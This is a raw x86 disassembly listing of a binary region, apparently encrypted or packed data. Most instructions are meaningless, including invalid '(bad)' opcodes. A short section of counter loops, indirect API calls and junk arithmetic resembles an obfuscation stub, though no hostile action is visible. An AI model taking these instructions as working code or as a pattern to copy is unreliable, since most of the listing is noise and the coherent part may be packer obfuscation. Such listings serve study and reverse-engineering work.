  418d45:	jne    0x418ccc
  418d47:	sbb    dh,BYTE PTR [esi]
  418d49:	cmp    cl,BYTE PTR [ecx-0x5060c480]
  418d4f:	(bad)  
  418d50:	add    al,0x16
  418d52:	or     cl,dh
  418d54:	add    bl,BYTE PTR [eax]
  418d56:	fwait
  418d57:	outs   dx,DWORD PTR ds:[esi]
  418d58:	xchg   esp,eax
  418d59:	xor    ebp,DWORD PTR [eax-0x66]
  418d5c:	mov    dl,0xfc
  418d5e:	xor    eax,0x9d043fc8
  418d63:	call   0xa78e:0x4a2347a
  418d6a:	or     al,0xcb
  418d6c:	push   ss
  418d6d:	mov    ebx,DWORD PTR [esi]
  418d6f:	jne    0x418d00
  418d71:	dec    eax
  418d72:	xchg   BYTE PTR [ebx+0x26],dh
  418d75:	jg     0x418da5
  418d77:	std    
  418d78:	mov    bh,0x57
  418d7a:	or     DWORD PTR [esi],0xff51a6
  418d80:	cmovle edx,DWORD PTR [ebx+0x41]
  418d84:	fnstcw WORD PTR [eax-0x66]
  418d87:	es out dx,eax
  418d89:	ja     0x418dcd
  418d8b:	push   esp
  418d8c:	push   ebx
  418d8d:	push   edi
  418d8e:	or     ecx,DWORD PTR [edx-0x72d0224a]
  418d94:	adc    ah,BYTE PTR [edx+esi*1]
  418d97:	jmp    0x418d8d
  418d99:	push   ebx
  418d9a:	in     eax,dx
  418d9b:	jmp    0x418e1b
  418d9d:	adc    BYTE PTR [esi],ch
  418d9f:	(bad)  
  418da1:	cmp    bh,BYTE PTR [edi]
  418da3:	std    
  418da4:	push   es
  418da5:	out    dx,al
  418da6:	inc    BYTE PTR [esi]
  418da8:	push   ecx
  418da9:	aaa    
  418daa:	xor    dl,ch
  418dac:	hlt    
  418dad:	mov    eax,0xed69bb15
  418db2:	fidiv  DWORD PTR [eax]
  418db4:	pop    edi
  418db5:	nop
  418db6:	jle    0x418d3f
  418db8:	or     ah,dh
  418dba:	aad    0xdb
  418dbc:	pop    eax
  418dbd:	inc    esi
  418dbe:	dec    edi
  418dbf:	mov    esp,0xd80ac014
  418dc4:	xchg   ecx,eax
  418dc5:	aas    
  418dc6:	dec    esi
  418dc7:	jecxz  0x418dde
  418dc9:	out    dx,eax
  418dca:	sti    
  418dcb:	repnz dec ebx
  418dcd:	xchg   esi,eax
  418dce:	mov    esp,0xfe16dd5c
  418dd3:	mov    ebx,0x10edc609
  418dd8:	mov    ah,0xcc
  418dda:	cmp    BYTE PTR [ebp+0x6eb73c35],bh
  418de0:	adc    ch,BYTE PTR [ebx+0x1b5e56d8]
  418de6:	inc    esp
  418de7:	stc    
  418de8:	jle    0x418e22
  418dea:	repz sub edx,eax
  418ded:	jno    0x418d7e
  418def:	pushf  
  418df0:	cmp    eax,0x6aad34ad
  418df5:	push   ebp
  418df6:	push   eax
  418df7:	dec    BYTE PTR [esi+0x79e60aea]
  418dfd:	lds    esi,FWORD PTR [esi]
  418dff:	xchg   esp,eax
  418e00:	rol    DWORD PTR [edi],1
  418e02:	in     al,0xc5
  418e04:	into   
  418e05:	push   cs
  418e06:	add    al,bl
  418e08:	mov    edi,0xabbfaf65
  418e0d:	call   0x9740:0x20fb14
  418e14:	push   cs
  418e15:	xchg   ecx,edi
  418e17:	lods   eax,DWORD PTR ds:[esi]
  418e18:	rcr    dh,cl
  418e1a:	push   eax
  418e1b:	fs pop ds
  418e1d:	mov    ds:0x6e20479b,eax
  418e22:	ficomp DWORD PTR [ecx-0x6a5796f1]
  418e28:	leave  
  418e29:	clc    
  418e2a:	stc    
  418e2b:	fs jo  0x418de9
  418e2e:	enter  0x68c,0x13
  418e32:	das    
  418e33:	shl    dh,1
  418e35:	imul   eax,DWORD PTR [edx+ebp*4+0x71f4d383],0xffffffc4
  418e3d:	cdq    
  418e3e:	xchg   edi,eax
  418e3f:	hlt    
  418e40:	or     al,0x8d
  418e42:	call   0xe04de27a
  418e47:	ficom  DWORD PTR [esi]
  418e49:	iret   
  418e4a:	into   
  418e4b:	int    0x4c
  418e4d:	fcomp  QWORD PTR [edi-0x70]
  418e50:	jecxz  0x418e56
  418e52:	mov    cl,0xc4
  418e54:	xor    edx,esi
  418e56:	jmp    FWORD PTR [esi+esi*1-0x15]
  418e5a:	push   cs
  418e5b:	out    0xd8,al
  418e5d:	cmp    BYTE PTR [ebx+0x6aefa66],ah
  418e63:	mov    eax,ds:0xf11190b1
  418e68:	mov    ebp,0x30ff64e1
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	sbb    eax,DWORD PTR [edx-0x75]
  418e84:	ror    BYTE PTR ds:0x7b787fc0,0x7e
  418e8b:	js     0x418f05
  418e8d:	inc    ecx
  418e8e:	cld    
  418e8f:	or     DWORD PTR [edi+0xfd1c784],eax
  418e95:	pop    ecx
  418e96:	sbb    BYTE PTR [ebx-0x27],0xa9
  418e9a:	push   esi
  418e9b:	jp     0x418ea8
  418e9d:	setne  BYTE PTR [ebx-0x4a]
  418ea1:	add    DWORD PTR ds:0x886606be,ebx
  418ea7:	xchg   edx,eax
  418ea8:	(bad)  
  418ea9:	out    0xfa,al
  418eab:	mov    eax,ds:0x1cd6f921
  418eb0:	inc    edi
  418eb1:	sbb    al,0xe
  418eb3:	sbb    edi,ecx
  418eb5:	and    al,0x65
  418eb7:	mov    WORD PTR [ecx-0x55ca40bf],fs
  418ebd:	mov    BYTE PTR [edi],bh
  418ebf:	mov    ebx,0x9299c48b
  418ec4:	imul   eax,DWORD PTR [edi],0xcd3c3d94
  418eca:	mov    ch,0xcd
  418ecc:	das    
  418ecd:	mov    dl,0x99
  418ecf:	mov    eax,fs
  418ed1:	push   esp
  418ed2:	cmp    al,0x55
  418ed4:	xor    DWORD PTR [ecx*4+0x48abbfd9],ebp
  418edb:	push   ebp
  418edc:	ins    BYTE PTR es:[edi],dx
  418edd:	jbe    0x418f09
  418edf:	and    DWORD PTR [eax-0x164e2427],esi
  418ee5:	or     al,0x7a
  418ee7:	enter  0xdca5,0x8
  418eeb:	lock pop ebp
  418eed:	aam    0xa3
  418eef:	mov    ?,WORD PTR [eax-0x5a59d922]
  418ef5:	xor    al,0xee
  418ef7:	mov    eax,0x1cad1a74
  418efc:	pop    edi
  418efd:	sbb    ecx,ecx
  418eff:	mov    ah,0x19
  418f01:	push   edi
  418f02:	sbb    ebx,DWORD PTR [eax-0x1f7994b9]
  418f08:	mov    esi,0x4bfb0c1
  418f0d:	stos   BYTE PTR es:[edi],al
  418f0e:	adc    al,BYTE PTR ds:0xcf504ef8
  418f14:	and    eax,0xfbfd4ad9
  418f19:	xor    DWORD PTR [edi+ecx*4],edx
  418f1c:	inc    ecx
  418f1d:	test   eax,0xfc6f1bb9
  418f22:	sbb    cl,BYTE PTR [edx+edx*2]
  418f25:	mov    BYTE PTR ds:0xfdc66a4d,ch
  418f2b:	test   edx,0x9fe82f1a
  418f31:	aaa    
  418f32:	mov    cl,0x3f
  418f34:	jno    0x418ec5
  418f36:	xlat   BYTE PTR ds:[ebx]
  418f37:	scas   al,BYTE PTR es:[edi]
  418f38:	cmp    DWORD PTR [ecx+edx*8-0x1f763a49],eax
  418f3f:	cmp    DWORD PTR [edi-0x67f4bc41],eax
  418f45:	and    cl,cl
  418f47:	mov    ebp,edi
  418f49:	aad    0x13
  418f4b:	test   BYTE PTR [edi-0x5e6eec17],ch
  418f51:	data16 aaa 
  418f53:	ins    BYTE PTR es:[edi],dx
  418f54:	push   ss
  418f55:	or     DWORD PTR [eax-0x3308cd11],ebp
  418f5b:	out    0xb,eax
  418f5d:	xchg   edx,eax
  418f5e:	push   0x77
  418f60:	mov    ds,WORD PTR ss:[ecx]
  418f63:	xchg   BYTE PTR ds:0x209463dc,dl
  418f69:	jg     0x418ef8
  418f6b:	call   0x2787034f
  418f70:	inc    eax
  418f71:	scas   eax,DWORD PTR es:[edi]
  418f72:	dec    ebx
  418f73:	cmp    ah,BYTE PTR [eax+0x8]
  418f76:	imul   BYTE PTR [ecx+0x2d]
  418f79:	inc    eax
  418f7a:	jle    0x418f41
  418f7c:	push   edi
  418f7d:	jns    0x418fc5
  418f7f:	fsubr  QWORD PTR [esi+0x3a6775ee]
  418f85:	(bad)  
  418f86:	cwde   
  418f87:	sub    DWORD PTR [esp+eax*4-0x78],edi
  418f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f8c:	jp     0x418fe9
  418f8e:	(bad)  
  418f8f:	pusha  
  418f90:	and    DWORD PTR [edx+0x4],0xe90f0a3e
  418f97:	leave  
  418f98:	es stc 
  418f9a:	push   esi
  418f9b:	inc    edi
  418f9c:	add    DWORD PTR [eax],ecx
  418f9e:	lock mov cs:0x9b079062,al
  418fa5:	das    
  418fa6:	or     BYTE PTR [esi-0x7e],0x8a
  418faa:	lods   al,BYTE PTR ds:[esi]
  418fab:	and    al,0xfd
  418fad:	xchg   edi,eax
  418fae:	and    DWORD PTR [edx+esi*2],0xc8af8eb2
  418fb5:	(bad)  
  418fb6:	ins    BYTE PTR es:[edi],dx
  418fb7:	push   esi
  418fb8:	cs pop esp
  418fba:	adc    bh,BYTE PTR [edi+0x6d]
  418fbd:	out    0x7a,al
  418fbf:	in     al,0xa2
  418fc1:	ficom  WORD PTR [edx]
  418fc3:	inc    ebx
  418fc4:	leave  
  418fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc6:	xor    BYTE PTR [ebx+ecx*1],bh
  418fc9:	test   edx,0x5ee61b54
  418fcf:	jno    0x419045
  418fd1:	pop    ds
  418fd2:	les    ebx,FWORD PTR [eax-0x10]
  418fd5:	push   0x1a
  418fd7:	in     eax,dx
  418fd8:	mov    ch,0xbe
  418fda:	jb     0x418fdc
  418fdc:	outs   dx,DWORD PTR ds:[esi]
  418fdd:	adc    al,0x10
  418fdf:	lods   al,BYTE PTR ds:[esi]
  418fe0:	dec    esi
  418fe1:	pop    ds
  418fe2:	jle    0x419034
  418fe4:	mov    dl,0x5d
  418fe6:	aad    0x32
  418fe8:	enter  0x17e4,0xf0
  418fec:	dec    ebp
  418fed:	cs js  0x418f98
  418ff0:	and    bh,BYTE PTR [esi-0xe]
  418ff3:	(bad)  
  418ff4:	outs   dx,DWORD PTR ds:[esi]
  418ff5:	mov    bl,0xd2
  418ff7:	adc    al,0x37
  418ff9:	push   ds
  418ffa:	test   eax,ebx
  418ffc:	repnz pop ss
  418ffe:	call   0x12dd0190
  419003:	xchg   ebp,eax
  419004:	les    edi,FWORD PTR [edi+0x1d]
  419007:	ficom  DWORD PTR [eax+0x283d0cb1]
  41900d:	xor    eax,DWORD PTR [ebp+ebx*8-0x52]
  419011:	(bad)  [edx+0x10]
  419014:	inc    ebp
  419015:	cmp    eax,DWORD PTR [edx+0x6c09d963]
  41901b:	jb     0x419043
  41901d:	popf   
  41901e:	(bad)  [ecx+edi*4]
  419021:	call   0xf163cb67
  419026:	xchg   edi,eax
  419027:	sub    BYTE PTR [ecx-0x6e08e084],dl
  41902d:	lahf   
  41902e:	into   
  41902f:	ret    
  419030:	lods   eax,DWORD PTR ds:[esi]
  419031:	in     al,0xbc
  419033:	xchg   edx,eax
  419034:	sbb    bh,BYTE PTR [ecx]
  419036:	mov    ds:0xf41b9af9,eax
  41903b:	pop    edx
  41903c:	sbb    al,0xb7
  41903e:	add    dl,BYTE PTR [ebp-0x31a087f3]
  419044:	add    esp,DWORD PTR [eax]
  419046:	test   al,0x81
  419048:	xchg   ebp,edx
  41904a:	mov    ecx,0xd0bca0d
  41904f:	daa    
  419050:	cmp    DWORD PTR [eax+ebp*4],0xfffffffa
  419054:	pop    ecx
  419055:	(bad)  
  419056:	or     eax,0xa080baf6
  41905b:	(bad)  
  41905c:	leave  
  41905d:	add    DWORD PTR fs:[ebp-0x55],ebp
  419061:	cmp    al,BYTE PTR [esi+0x78cfeaef]
  419067:	jge    0x419029
  419069:	imul   ebx,DWORD PTR [ebp-0x6c],0x88b0d2b3
  419070:	hlt    
  419071:	xor    cl,BYTE PTR [ebx-0x66]
  419074:	jb     0x41900b
  419076:	jmp    0xfa8c:0x972154a
  41907d:	scas   al,BYTE PTR es:[edi]
  41907e:	sbb    eax,0x599d64a5
  419083:	sar    DWORD PTR [edx],0x7
  419086:	mov    al,0x40
  419088:	mov    BYTE PTR [eax+0x66],0xf4
  41908c:	jl     0x4190fa
  41908e:	aad    0x6f
  419090:	add    bl,BYTE PTR [esi]
  419092:	bound  eax,QWORD PTR [ebx]
  419094:	jae    0x419098
  419096:	mov    ebx,0x32579575
  41909b:	fsubp  st(1),st
  41909d:	pop    ebp
  41909e:	sub    ebx,ebp
  4190a0:	jl     0x419065
  4190a2:	arpl   WORD PTR [edx],cx
  4190a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a5:	cmp    eax,DWORD PTR [eax+ecx*2-0x7b2d6bfa]
  4190ac:	enter  0xe6fa,0x89
  4190b0:	and    al,0xca
  4190b2:	(bad)  
  4190b3:	mov    eax,0xae05554
  4190b8:	adc    ebx,DWORD PTR [edx-0x6e]
  4190bb:	test   BYTE PTR [ebx],al
  4190bd:	clc    
  4190be:	pop    ebx
  4190bf:	dec    eax
  4190c0:	dec    esi
  4190c1:	ins    DWORD PTR es:[edi],dx
  4190c2:	or     dl,al
  4190c4:	fsub   QWORD PTR [eax]
  4190c6:	push   ss
  4190c7:	sub    bh,dh
  4190c9:	jp     0x4190de
  4190cb:	retf   0x8c78
  4190ce:	lea    ecx,[ebx+0x4f69f36e]
  4190d4:	sbb    eax,0xa71cd4b7
  4190d9:	dec    ebp
  4190da:	loop   0x419103
  4190dc:	and    eax,DWORD PTR [edx-0x45]
  4190df:	frstor [ecx]
  4190e1:	loope  0x41915f
  4190e3:	jmp    FWORD PTR ds:0xcfa698bc
  4190e9:	mov    ecx,DWORD PTR [eax]
  4190eb:	leave  
  4190ec:	mov    cl,0x19
  4190ee:	je     0x4190f4
  4190f0:	dec    ecx
  4190f1:	mov    eax,0xbd90be3
  4190f6:	scas   al,BYTE PTR es:[edi]
  4190f7:	addr16 test al,0x98
  4190fa:	inc    ebx
  4190fb:	jns    0x419092
  4190fd:	(bad)  
  4190fe:	jbe    0x419094
  419100:	repnz cmp DWORD PTR [esi],0xffffffe2
  419104:	xchg   BYTE PTR [esi+edi*1-0x795bead4],ah
  41910b:	inc    ebx
  41910c:	test   BYTE PTR [esi],dl
  41910e:	pop    eax
  41910f:	mov    al,0xf
  419111:	fiadd  DWORD PTR [ebp+0x7c5a0ea4]
  419117:	aas    
  419118:	push   esp
  419119:	daa    
  41911a:	int3   
  41911b:	dec    ebx
  41911c:	(bad)  
  41911d:	das    
  41911e:	test   DWORD PTR [ecx-0x29],eax
  419121:	xchg   edx,eax
  419122:	jns    0x419133
  419124:	push   esi
  419125:	sbb    BYTE PTR [ebx],cl
  419127:	xlat   BYTE PTR ds:[ebx]
  419128:	cwde   
  419129:	pop    edi
  41912a:	test   al,0x21
  41912c:	mov    esp,0xfaeb4e50
  419131:	push   cs
  419132:	push   es
  419133:	add    ecx,ebp
  419135:	add    al,0x0
  419137:	loope  0x419173
  419139:	popa   
  41913a:	aad    0x6c
  41913c:	push   esi
  41913d:	loope  0x41917e
  41913f:	xor    DWORD PTR [ebp+0x608ccf6c],eax
  419145:	dec    ebx
  419146:	xor    al,0xf9
  419148:	xchg   BYTE PTR [ebp-0x647d169b],ah
  41914e:	js     0x419158
  419150:	idiv   BYTE PTR [ebx-0x1ea5f0fe]
  419156:	cmp    bh,BYTE PTR [ecx-0x7f49f255]
  41915c:	retf   0x29b5
  41915f:	retf   
  419160:	shl    DWORD PTR [edx],cl
  419162:	add    al,0x94
  419164:	in     al,0x6c
  419166:	fild   WORD PTR [ebx]
  419168:	psubb  mm5,QWORD PTR [ecx-0x64ea1c13]
  41916f:	adc    bl,dh
  419171:	sub    al,0x29
  419173:	jp     0x41911e
  419175:	rol    DWORD PTR [edi+0x51],cl
  419178:	call   0x1534:0x85a2e6b9
  41917f:	sbb    BYTE PTR [ecx],al
  419181:	mov    ebx,0x110161af
  419186:	outs   dx,DWORD PTR ds:[esi]
  419187:	js     0x41915a
  419189:	sbb    eax,0x3e9d0ff
  41918e:	add    BYTE PTR [eax],al
  419190:	add    BYTE PTR [ebx-0x3d36efbb],cl
  419196:	or     al,0x0
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ds,WORD PTR [esi]
  4191b0:	jo     0x41917f
  4191b2:	js     0x4191bc
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x41921b
  4191bc:	outs   dx,DWORD PTR ds:[esi]
  4191bd:	ret    0x62d1
  4191c0:	mov    cl,0xd
  4191c2:	pop    esp
  4191c3:	and    BYTE PTR [eax+0x4],al
  4191c6:	mov    WORD PTR [ebx],fs
  4191c8:	je     0x4191ff
  4191ca:	xchg   edi,eax
  4191cb:	stos   BYTE PTR es:[edi],al
  4191cc:	jmp    0x99a5:0xc3441afc
  4191d3:	inc    esi
  4191d4:	mov    WORD PTR [ebp-0xe],?
  4191d7:	call   0x1d85:0x49d80b34
  4191de:	add    ebp,eax
  4191e0:	jne    0x4191c6
  4191e2:	int3   
  4191e3:	cmp    al,0x20
  4191e5:	xor    eax,0xfdab4c90
  4191ea:	std    
  4191eb:	add    ch,ah
  4191ed:	dec    ecx
  4191ee:	cli    
  4191ef:	cmp    al,0xa3
  4191f2:	add    bl,dh
  4191f4:	mov    dl,0x7e
  4191f6:	sbb    DWORD PTR ds:0xf16eeeb9,eax
  4191fc:	xchg   dl,al
  4191fe:	cmp    cl,0x2b
  419201:	shr    BYTE PTR [ecx],cl
  419203:	cmc    
  419204:	xchg   edx,esi
  419206:	lea    ecx,[eax]
  419208:	xor    al,0x49
  41920a:	leave  
  41920b:	cmp    eax,0x730f378e
  419210:	and    eax,0xf1c0b41
  419215:	rol    BYTE PTR [ecx-0x55],0xf1
  419219:	bound  edx,QWORD PTR [edi+edx*4-0x2c]
  41921d:	or     DWORD PTR [edx+0x4a],eax
  419220:	push   ds
  419221:	sahf   
  419222:	mov    ecx,0xad1a9e9d
  419227:	leave  
  419228:	or     ebp,eax
  41922a:	(bad)  
  41922b:	std    
  41922c:	loope  0x41927c
  41922e:	call   0xce85:0x5b6ff8cf
  419235:	mov    ah,0xc5
  419237:	dec    edx
  419238:	fcomp  QWORD PTR [esi-0x7daca51e]
  41923e:	mov    ds:0x80c24f31,eax
  419243:	jmp    0x419212
  419245:	inc    BYTE PTR [ebp-0x14c441e0]
  41924b:	push   ebp
  41924c:	das    
  41924d:	jecxz  0x4192a9
  41924f:	mov    WORD PTR [ecx-0x5a],?
  419252:	sbb    al,0xae
  419254:	loope  0x419219
  419256:	dec    edx
  419257:	fnstcw WORD PTR [edx+0x7]
  41925a:	popa   
  41925b:	xchg   edx,eax
  41925c:	jnp    0x41922a
  41925e:	test   dh,ch
  419260:	pop    ds
  419261:	jnp    0x4192a7
  419263:	call   0xd456136c
  419268:	rcl    DWORD PTR [edx],cl
  41926a:	jns    0x4192d5
  41926c:	and    al,0x2c
  41926e:	fstp   DWORD PTR [esi]
  419270:	mov    edx,0x98806af4
  419275:	adc    DWORD PTR [esi],eax
  419277:	xlat   BYTE PTR ds:[ebx]
  419278:	bound  esp,QWORD PTR [edx-0xba6ef14]
  41927e:	das    
  41927f:	enter  0x7277,0x48
  419283:	in     al,dx
  419284:	dec    edi
  419285:	push   edx
  419286:	xchg   ecx,eax
  419287:	xchg   edi,eax
  419288:	xchg   dx,ax
  41928a:	fcmovb st,st(5)
  41928c:	mov    WORD PTR ds:0x6276fb82,?
  419292:	push   ss
  419293:	icebp  
  419294:	mov    ah,0x83
  419296:	pop    ecx
  419297:	(bad)
  41929a:	or     esi,DWORD PTR [ebp+0x3d]
  41929d:	xor    eax,0x69dddfa7
  4192a2:	popa   
  4192a3:	cmp    BYTE PTR [edx-0x5e],0x2b
  4192a7:	ja     0x41922f
  4192a9:	fwait
  4192aa:	jae    0x4192c5
  4192ac:	sbb    al,0x55
  4192ae:	cmp    DWORD PTR [ebx+edx*1-0x169cdc16],0x70
  4192b6:	adc    DWORD PTR [esi],ebp
  4192b8:	daa    
  4192b9:	das    
  4192ba:	retf   
  4192bb:	imul   ecx,DWORD PTR [eax-0x13],0x7
  4192bf:	push   edx
  4192c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192c1:	in     al,dx
  4192c2:	cs inc edx
  4192c4:	xchg   esi,eax
  4192c5:	lea    eax,[esi+0x6f8e5290]
  4192cb:	sub    dh,BYTE PTR [edx]
  4192cd:	adc    esp,DWORD PTR es:[ebx+0x48]
  4192d1:	cs ja  0x419337
  4192d4:	xchg   ecx,eax
  4192d5:	ja     0x4192de
  4192d7:	ja     0x41925a
  4192d9:	ss mov esp,0x9a4efd6a
  4192df:	inc    esp
  4192e0:	push   cs
  4192e1:	jae    0x419308
  4192e3:	push   esi
  4192e4:	adc    eax,0xe7ccd663
  4192e9:	lahf   
  4192ea:	xchg   esi,eax
  4192eb:	push   esp
  4192ec:	push   0xffffff89
  4192ee:	popa   
  4192ef:	and    DWORD PTR [ebx-0x43],ecx
  4192f2:	sub    BYTE PTR [ecx],ch
  4192f4:	push   edi
  4192f5:	and    BYTE PTR [ebp-0x218af1af],0xcc
  4192fc:	jnp    0x41937a
  4192fe:	fisubr DWORD PTR [esi+0xe9869f8]
  419304:	inc    esp
  419305:	push   ecx
  419306:	push   ebx
  419307:	inc    edi
  419308:	sahf   
  419309:	xor    DWORD PTR [edx],0xffffffb5
  41930c:	(bad)
  41930f:	div    BYTE PTR [edi-0x21]
  419312:	aaa    
  419313:	or     DWORD PTR [esi+0x5b72b810],edx
  419319:	loop   0x4192da
  41931b:	leave  
  41931c:	das    
  41931d:	test   BYTE PTR [ecx+0x2f673882],dh
  419323:	hlt    
  419324:	in     al,0xb8
  419326:	aad    0x43
  419328:	and    DWORD PTR [esi],eax
  41932a:	outs   dx,BYTE PTR ds:[esi]
  41932b:	in     eax,dx
  41932c:	gs dec esp
  41932e:	push   ecx
  41932f:	add    DWORD PTR [edi-0x49709e27],esp
  419335:	cmp    al,bh
  419337:	daa    
  419338:	cld    
  419339:	mov    cs,WORD PTR [ecx]
  41933b:	test   al,0xcf
  41933d:	call   0xef2aff8
  419342:	scas   al,BYTE PTR es:[edi]
  419343:	sub    DWORD PTR [edx],edx
  419345:	pop    edx
  419346:	jmp    0xf6f0:0x1249d7ff
  41934d:	dec    esp
  41934e:	imul   esi,DWORD PTR [ebp-0x1e],0x99b531f7
  419355:	fldcw  WORD PTR [eax]
  419357:	xor    ebx,DWORD PTR [esp+esi*2+0x2]
  41935b:	retf   0x26fb
  41935e:	aas    
  41935f:	xchg   esp,eax
  419360:	shl    DWORD PTR [ebx-0x23],cl
  419363:	dec    eax
  419364:	ins    BYTE PTR es:[edi],dx
  419365:	enter  0x7fe4,0xf6
  419369:	dec    esp
  41936a:	sbb    al,0xde
  41936c:	popa   
  41936d:	adc    DWORD PTR ds:0xe090905b,esp
  419373:	shr    BYTE PTR [edx],0xb8
  419376:	je     0x41937a
  419378:	sub    cl,bh
  41937a:	fwait
  41937b:	retf   0x8690
  41937e:	push   0x5d47184e
  419383:	(bad)  
  419384:	cli    
  419385:	gs imul edi
  419388:	outs   dx,BYTE PTR ds:[esi]
  419389:	push   0xffffff83
  41938b:	ror    ch,cl
  41938d:	mov    ds:0x31a8fbfb,eax
  419392:	and    ah,BYTE PTR ds:[ebx+0x59f31a02]
  419399:	mov    ds:0x4cc8109b,al
  41939e:	xor    DWORD PTR [ebp+0x1b818a4],esp
  4193a4:	inc    edi
  4193a5:	das    
  4193a6:	mov    eax,fs
  4193a8:	popa   
  4193a9:	inc    eax
  4193aa:	add    al,0x31
  4193ac:	mov    ds:0x2e3f5d2,eax
  4193b1:	adc    BYTE PTR [ebx+0x22002a4e],ch
  4193b7:	dec    esi
  4193b8:	jp     0x4193ce
  4193ba:	jg     0x4193ab
  4193bc:	jg     0x419361
  4193be:	mov    al,ds:0xc7d043de
  4193c3:	fstp   DWORD PTR [ebp-0x6a77f605]
  4193c9:	outs   dx,DWORD PTR ds:[esi]
  4193ca:	bound  edi,QWORD PTR [edx+0x2838cfcf]
  4193d0:	fcmovnu st,st(4)
  4193d2:	pop    edi
  4193d4:	inc    ebp
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	jge    0x419386
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi+0x16],eax
  41952b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41952d:	push   edi
  41952e:	and    bl,cl
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x419535
  419537:	jmp    0x41953b
  419539:	mov    WORD PTR [esi+edi*2+0x4e46657d],?
  419540:	jp     0x419563
  419542:	mov    ds:0xb1a97566,eax
  419547:	inc    ebx
  419548:	mov    ebx,0xbcd386d2
  41954d:	lock idiv DWORD PTR [ecx+ebp*2+0x2979828f]
  419555:	arpl   WORD PTR [ebp-0x676ceba5],bp
  41955b:	pop    ebp
  41955c:	dec    esi
  41955d:	xchg   esp,eax
  41955e:	push   ebp
  41955f:	sub    eax,eax
  419561:	push   eax
  419562:	mov    esp,0xfc0dd165
  419567:	dec    esi
  419568:	scas   eax,DWORD PTR es:[edi]
  419569:	gs ret 
  41956b:	mov    BYTE PTR [ecx+0xacd413c],bh
  419571:	jmp    0x41958e
  419573:	aaa    
  419574:	pop    ds
  419575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419576:	xchg   ebp,eax
  419577:	stc    
  419578:	xchg   esi,eax
  419579:	test   al,bl
  41957b:	clc    
  41957c:	cmp    BYTE PTR [edx],0xda
  41957f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419580:	daa    
  419581:	lahf   
  419582:	xchg   ecx,eax
  419583:	iret   
  419584:	mov    ch,0xb6
  419586:	test   eax,0x15f6b4a0
  41958b:	stc    
  41958c:	into   
  41958d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41958e:	mov    eax,ds:0xfce05e2e
  419593:	jmp    0x4195bb
  419595:	adc    DWORD PTR [ecx],ecx
